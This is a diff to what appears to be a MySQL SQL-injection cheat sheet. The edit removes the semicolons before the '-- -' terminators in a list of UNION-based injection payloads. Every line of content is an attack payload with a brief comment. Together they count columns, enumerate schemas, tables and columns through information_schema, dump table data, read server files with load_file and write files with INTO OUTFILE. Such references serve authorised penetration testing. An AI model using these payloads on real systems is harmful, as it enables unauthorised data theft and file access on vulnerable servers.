@@ -3,16 +3,16 @@ syntax: mysql
 ---
 # UNION-based SQL injection
 # - find number of columns by selecting different numbers of null's or 1's
-... union select null,null,null;-- -
+... union select null,null,null-- -
 # - find column compatible with string type by testing each column
-... union select null,null,'TEST';-- -
+... union select null,null,'TEST'-- -
 # - show databases
-... union select null,null,group_concat(schema_name separator '\n') from information_schema.schemata;-- -
+... union select null,null,group_concat(schema_name separator '\n') from information_schema.schemata-- -
 # - show tables and columns of database
-... union select null,null,group_concat(concat(table_name, ':', column_name) separator '\n') from information_schema.columns where table_schema = 'DB';-- -
+... union select null,null,group_concat(concat(table_name, ':', column_name) separator '\n') from information_schema.columns where table_schema = 'DB'-- -
 # - select data from table
-... union select null,null,group_concat(concat(COL1, ':', COL2) separator '\n') from DB.TABLE;-- -
+... union select null,null,group_concat(concat(COL1, ':', COL2) separator '\n') from DB.TABLE-- -
 # - read file
-... union select null,null,load_file('/some/file');-- -
+... union select null,null,load_file('/some/file')-- -
 # - write file
-... union select null,null,'TEST' into outfile '/some/file';-- -
+... union select null,null,'TEST' into outfile '/some/file'-- -
